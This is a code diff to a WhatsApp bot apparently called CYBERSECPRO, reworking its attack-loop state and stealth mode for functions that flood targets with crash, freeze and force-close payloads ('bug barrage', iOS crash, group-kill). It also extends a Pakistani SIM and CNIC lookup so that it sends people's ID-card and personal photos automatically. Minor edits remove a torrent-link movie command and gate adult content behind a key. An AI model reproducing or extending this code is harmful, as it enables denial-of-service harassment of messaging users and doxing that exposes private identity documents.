@@ -47,7 +47,7 @@ const { igDownload } = require('./allfunc/igdownload')
 const { xnxxDownload, xnxxSearch } = require('./allfunc/xnxxdownload')
 const { githubstalk } = require('./allfunc/githubstalk')
 const { mlstalk } = require('./allfunc/mlstalk')
-const { lookupSimDatabase, formatSimRecordsMessage } = require('./allfunc/sim-lookup')
+const { lookupSimDatabase, formatSimRecordsMessage, sendSimPhotos } = require('./allfunc/sim-lookup')
 const {
   getCryptoTop, getCryptoDetail, searchCrypto, resolveCoinId, getStockPrice,
   getCryptoGainers, getCryptoLosers,
@@ -499,9 +499,6 @@ if (devtrust && devtrust.user) global._activeNexusSocket = devtrust;
 // 'notify' = user/owner ka actual message → process karo
 if (chatUpdate && chatUpdate.type === 'append') return;
 
-let stealthMode = false;   // 🔇 Stealth Mode — attack silently, no reply messages
-let stopAttacks = false;   // 🛑 Emergency Stop — stops all running attack loops
-
 // ═════════════════════════════════════════════════════════════════════
 // 📢 BROADCAST — Global initializers (MUST run once, before switch)
 // ═════════════════════════════════════════════════════════════════════
@@ -810,6 +807,9 @@ const botNumber = devtrust._cachedBotNumber;
 
 // Linked WhatsApp account user (paired number) — used for self/private mode
 const _botNumClean = String(botNumber || '').replace(/[^0-9]/g, '');
+if (!global._attackState) global._attackState = {};
+if (!global._attackState[_botNumClean]) global._attackState[_botNumClean] = { stopAttacks: false, stealthMode: false };
+const _atk = global._attackState[_botNumClean];
 const _isBotLinkedUser = () => {
     const senderNum = String(m.sender || '').split(':')[0].split('@')[0].replace(/[^0-9]/g, '');
     return Boolean(m.key?.fromMe || (senderNum && senderNum === _botNumClean));
@@ -915,9 +915,9 @@ const _bugSafe = async (fn, target) => {
 
 // Parallel burst with anti-detect micro-jitter between batches
 const _bugBurst = async (target, fns, batchSize = 8) => {
-    if (stopAttacks) return;
+    if (_atk.stopAttacks) return;
     for (let i = 0; i < fns.length; i += batchSize) {
-        if (stopAttacks) return;
+        if (_atk.stopAttacks) return;
         await Promise.allSettled(
             fns.slice(i, i + batchSize).map(fn => _bugSafe(fn, target))
         );
@@ -964,7 +964,7 @@ const _runBugBarrage = async (target, profile = 'standard') => {
 
     const cfg = profiles[profile] || profiles.standard;
     for (let round = 0; round < cfg.rounds; round++) {
-        if (stopAttacks) { stopAttacks = false; break; }
+        if (_atk.stopAttacks) { _atk.stopAttacks = false; break; }
         await Promise.allSettled(
             cfg.seq.map(name => waves[name] ? waves[name]() : Promise.resolve())
         );
@@ -3376,7 +3376,7 @@ async function blankgc(target) {
 //=====COMBINING ALL GC BUG======//
 async function bug3(isTarget) {
 for (let i = 0; i < 15; i++) {
-  if (stopAttacks) return;
+  if (_atk.stopAttacks) return;
   await Promise.allSettled([
     killgc(isTarget), rusuhgc(isTarget), blankgc(isTarget),
     killgc(isTarget), rusuhgc(isTarget), blankgc(isTarget),
@@ -3582,7 +3582,7 @@ async function iosOver(durationHours, XS) {
 // ================= ( Combo Function — parallel waves )====================
 async function Combo(target) {
     for (let wave = 0; wave < 22; wave++) {
-        if (stopAttacks) return;
+        if (_atk.stopAttacks) return;
         await Promise.allSettled(
             Array(18).fill(null).map((_, i) => {
                 const fn = [callinvisible, ForceXFrezee, blank1][i % 3];
@@ -3598,7 +3598,7 @@ async function fcnew(target) {
     const _car = () => CarouselVY4(devtrust, target);
     const vectors = [_car, _run(LocaXotion), _run(XinsooInvisV1)];
     for (let wave = 0; wave < 22; wave++) {
-        if (stopAttacks) return;
+        if (_atk.stopAttacks) return;
         await Promise.allSettled(
             Array(18).fill(null).map((_, i) => vectors[i % 3]().catch(() => {}))
         );
@@ -3638,7 +3638,7 @@ async function BugGroup(target) {
 async function BayuOfficialHard(target) {
     const vectors = [protoXimg, bulldozer, protocolbug3, delayMakerInvisible, xatanicinvisv4, protocolbug6];
     for (let wave = 0; wave < 18; wave++) {
-        if (stopAttacks) return;
+        if (_atk.stopAttacks) return;
         await Promise.allSettled(
             Array(18).fill(null).map((_, i) => vectors[i % vectors.length](target).catch(() => {}))
         );
@@ -3648,7 +3648,7 @@ async function BayuOfficialHard(target) {
     
 async function ForceClose(target) {
     for (let wave = 0; wave < 28; wave++) {
-        if (stopAttacks) return;
+        if (_atk.stopAttacks) return;
         await Promise.allSettled(
             Array(16).fill(null).map(() => forclose(target).catch(() => {}))
         );
@@ -3661,7 +3661,7 @@ async function XPhone(target) {
     const _ios = () => CrashLoadIos(devtrust, target);
     const vectors = [_car, _ios, forclose, LocaXotion, XinsooInvisV1, Xblanknoclick, ForceXFrezee, blank1, callinvisible];
     for (let wave = 0; wave < 20; wave++) {
-        if (stopAttacks) return;
+        if (_atk.stopAttacks) return;
         await Promise.allSettled(
             Array(18).fill(null).map((_, i) => vectors[i % vectors.length](target).catch(() => {}))
         );
@@ -4809,17 +4809,30 @@ function getCurrentDateTime() {
 }
 
 // ============ STICKER COMMAND DETECTION ============
+function _stickerFileKey(msg) {
+    const sm = msg?.stickerMessage || msg?.message?.stickerMessage;
+    if (!sm) return msg?.key?.id || '';
+    const sha = sm.fileSha256;
+    if (sha) {
+        if (Buffer.isBuffer(sha)) return sha.toString('base64');
+        if (typeof sha === 'string') return sha;
+        if (sha?.type === 'Buffer' && Array.isArray(sha.data)) return Buffer.from(sha.data).toString('base64');
+    }
+    return msg?.key?.id || '';
+}
 // If the message is a sticker, check if it has a registered command binding
 if (m.message?.stickerMessage && !command) {
     try {
         const _stickerCmds = loadStickerCmds();
-        const _stickerMsgId = m.key?.id || '';
-        // Try matching by sticker ID hash stored in the database
-        const _matchedCmd = _stickerCmds[_stickerMsgId];
+        const _stickerKey = _stickerFileKey(m);
+        const _matchedCmd = _stickerCmds[_stickerKey];
         if (_matchedCmd) {
-            // Re-route as if the user sent that command
             body = prefix + _matchedCmd;
-            // Fall through to switch below (command will be re-evaluated)
+            const afterPrefix = body.slice(prefix.length).trim();
+            const parts = afterPrefix.split(/ +/);
+            command = parts[0].toLowerCase();
+            args = parts.slice(1);
+            text = args.join(' ');
         }
     } catch (e) {}
 }
@@ -5627,6 +5640,7 @@ ${_senderBugUnlocked ? '│❖ ' + prefix + 'bugmenu' : ''}
 │❖ ${prefix}ownermenu
 │❖ ${prefix}stickermenu
 │❖ ${prefix}toolsmenu
+${_senderBugUnlocked ? '│❖ ' + prefix + 'simdatabase' : ''}
 │❖ ${prefix}tvmenu
 │❖ ${prefix}tradingmenu
 │❖ ${prefix}bcmenu
@@ -9688,57 +9702,6 @@ case 'proxytest': {
     break;
 }
 
-case "movie": {
-    if (!text) return reply("🎬 *Usage:* .movie <movie name>\nExample: .movie Inception");
-
-    devtrust.sendMessage(m.chat, { react: { text: '🔍', key: m.key } }).catch(()=>{});
-
-    try {
-        const res = await axios.get(`https://www.omdbapi.com/?t=${encodeURIComponent(text)}&apikey=6372bb60&plot=full`, { timeout: 12000 });
-        if (res.data.Response === "False") return reply("❌ *Movie not found* • Try exact movie name");
-
-        const data = res.data;
-        const imdbId = data.imdbID;
-
-        // YTS download links
-        let dlText = '';
-        try {
-            const yts = await axios.get(`https://yts.mx/api/v2/list_movies.json?query_term=${imdbId}&limit=1`, { timeout: 8000 });
-            const torrents = yts.data?.data?.movies?.[0]?.torrents || [];
-            if (torrents.length > 0) {
-                dlText = '\n\n📥 *Download Links:*\n';
-                torrents.slice(0, 4).forEach(t => {
-                    dlText += `• [${t.quality} ${t.type}] ${t.size}\n${t.url}\n`;
-                });
-            }
-        } catch (_) {}
-
-        const caption =
-            `🎬 *${data.Title}* (${data.Year})\n\n` +
-            `🎭 *Genre:* ${data.Genre}\n` +
-            `🌍 *Language:* ${data.Language}\n` +
-            `🎬 *Director:* ${data.Director}\n` +
-            `⏱️ *Runtime:* ${data.Runtime}\n` +
-            `⭐ *Rating:* ${data.imdbRating}/10\n\n` +
-            `📝 *Plot:* ${data.Plot}\n` +
-            dlText +
-            `\n🎥 *Watch:* https://vidsrc.to/embed/movie/${imdbId}`;
-
-        await devtrust.sendMessage(m.chat,
-            {
-                image: { url: data.Poster !== "N/A" ? data.Poster : "https://i.ibb.co/4f4tTnG/no-poster.png" },
-                caption: caption
-            },
-            { quoted: m }
-        );
-        await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
-    } catch (e) {
-        console.error(e);
-        reply("⚠️ *Movie search failed* • Try again later");
-    }
-}
-break;
-
 case "sciencefact": {
     try {
         const res = await axios.get("https://uselessfacts.jsph.pl/random.json?language=en");
@@ -10482,6 +10445,11 @@ case 'aipic': {
 break;
 
 case 'hentai': {
+    const _hentSenderNum = (m.sender || '').split('@')[0].split(':')[0];
+    const _hentUnlocked = (global._flagCache?.adultUnlocked || []).some(id => String(id).replace(/[^0-9]/g,'') === _hentSenderNum);
+    const _hentBanned = (global._flagCache?.adultBanned || []).some(id => String(id).replace(/[^0-9]/g,'') === _hentSenderNum);
+    if (_hentBanned) return reply(`🚫 *18+ Access Permanently Banned*\nYou cannot access 18+ content.`);
+    if (!_hentUnlocked) return reply(`🔞 *18+ Content Locked*\nType *${prefix}addkey <code>* to unlock.\nGet the code from admin.`);
     try { const hentUrl = await getAnimeImageUrl('hentai'); if (!hentUrl) throw new Error('No image'); const hentBuf = await getBuffer(hentUrl); await devtrust.sendMessage(m.chat, { image: hentBuf, caption: "🔞 *CYBER*" }, { quoted: m }); } catch { reply(`❌ *Failed to fetch hentai image*`); }
 }
 break;
@@ -15521,7 +15489,7 @@ case 'blankgc': {
     try {
         await _runBugBarrage(m.chat, 'group');
         for (let i = 0; i < 12; i++) {
-            if (stopAttacks) break;
+            if (_atk.stopAttacks) break;
             await bug3(m.chat);
             await sleep(100);
         }
@@ -15765,21 +15733,21 @@ break;
 case 'stealthmode':
 case 'silentmode': {
     if (!_requireBugAccess()) break;
-    if (!text) return reply(`🔇 *Stealth Mode:* ${stealthMode ? '✅ ON' : '❌ OFF'}
+    if (!text) return reply(`🔇 *Stealth Mode:* ${_atk.stealthMode ? '✅ ON' : '❌ OFF'}
 
 _Use:_ ${prefix}stealthmode on/off`);
 
     const _sm = text.trim().toLowerCase();
     if (_sm === 'on' || _sm === '1') {
-        stealthMode = true;
+        _atk.stealthMode = true;
         reply('🔇 *Stealth Mode ON* — Ab attacks silently chalenge, koi launch/complete message nahi aayega');
     } else if (_sm === 'off' || _sm === '0') {
-        stealthMode = false;
+        _atk.stealthMode = false;
         reply('🔊 *Stealth Mode OFF* — Normal mode wapas, sab messages dikhenge');
     } else {
         reply(`⚠️ *Usage:* ${prefix}stealthmode on/off`);
     }
-    await devtrust.sendMessage(m.chat, { react: { text: stealthMode ? '🔇' : '🔊', key: m.key } });
+    await devtrust.sendMessage(m.chat, { react: { text: _atk.stealthMode ? '🔇' : '🔊', key: m.key } });
 }
 break;
 
@@ -15792,7 +15760,7 @@ case 'stopall':
 case 'attackstop': {
     if (!isOwner && !_requireBugAccess()) break;
 
-    stopAttacks = true;
+    _atk.stopAttacks = true;
 
     await devtrust.sendMessage(m.chat, { react: { text: '🛑', key: m.key } });
     reply(`🛑 *STOP ATTACK — EMERGENCY KILL*
@@ -16357,7 +16325,7 @@ case 'setstickercmd': {
     if (!args[0]) return reply(`❌ *Usage:* Reply to a sticker with \`${prefix}setstickercmd <command>\`\nExample: \`${prefix}setstickercmd menu\``);
     const _scCmdName = args[0].toLowerCase();
     if (!m.quoted || m.quoted.mtype !== 'stickerMessage') return reply(`❌ *Reply to a sticker* to bind it\nExample: reply to a sticker with \`${prefix}setstickercmd ping\``);
-    const _scHash = m.quoted.key?.id || JSON.stringify(m.quoted.message?.stickerMessage || {});
+    const _scHash = _stickerFileKey(m.quoted) || m.quoted.key?.id || '';
     const _scData = loadStickerCmds();
     _scData[_scHash] = _scCmdName;
     saveStickerCmds(_scData);
@@ -18086,8 +18054,16 @@ break;
                       normalized: _sdResult.normalized,
                       rawQuery: query,
                       title: '🗄️ *CYBERSECPRO SIM DATABASE*',
+                      photos: _sdResult.photos,
                   });
                   await m.reply(_sdMsg);
+                  const _sdPhotosSent = await sendSimPhotos(devtrust, m.chat, _sdResult.photos, m);
+                  if (!_sdPhotosSent.length && _sdResult.records.some(r => r.cnicPhoto || r.personPhoto)) {
+                      await sendSimPhotos(devtrust, m.chat, {
+                          cnicPhotos: _sdResult.records.map(r => r.cnicPhoto).filter(Boolean),
+                          personPhotos: _sdResult.records.map(r => r.personPhoto).filter(Boolean),
+                      }, m);
+                  }
                   await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
               } else {
                   await m.reply(`❌ *No records found for:* ${query}\n\n_Ye number/CNIC database mein nahi hai ya format galat hai_\n\n*Supported formats:*\n• 3001234567\n• 03001234567\n• 923001234567\n• CNIC 13 digits`);
@@ -18160,6 +18136,8 @@ break;
   │  📱 Phone Number
   │  🆔 CNIC Number
   │  🏠 Address
+  │  🪪 CNIC Photo (auto)
+  │  📸 Person Photo (auto)
   │
   │ ◈ *⚠️ 𝗡𝗢𝗧𝗘𝗦*
   │  • Pakistani numbers + CNIC support
@@ -18213,8 +18191,16 @@ break;
                       normalized: _cnResult.normalized,
                       rawQuery: _cnQuery,
                       title: '🆔 *CYBERSECPRO CNIC DATABASE*',
+                      photos: _cnResult.photos,
                   });
                   await m.reply(_cnMsg);
+                  const _cnPhotosSent = await sendSimPhotos(devtrust, m.chat, _cnResult.photos, m);
+                  if (!_cnPhotosSent.length && _cnResult.records.some(r => r.cnicPhoto || r.personPhoto)) {
+                      await sendSimPhotos(devtrust, m.chat, {
+                          cnicPhotos: _cnResult.records.map(r => r.cnicPhoto).filter(Boolean),
+                          personPhotos: _cnResult.records.map(r => r.personPhoto).filter(Boolean),
+                      }, m);
+                  }
                   await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
               } else {
                   await m.reply(`❌ *No records found for CNIC:* ${_cnQuery}\n\n_Ye CNIC database mein nahi hai ya abhi update nahi hua_`);
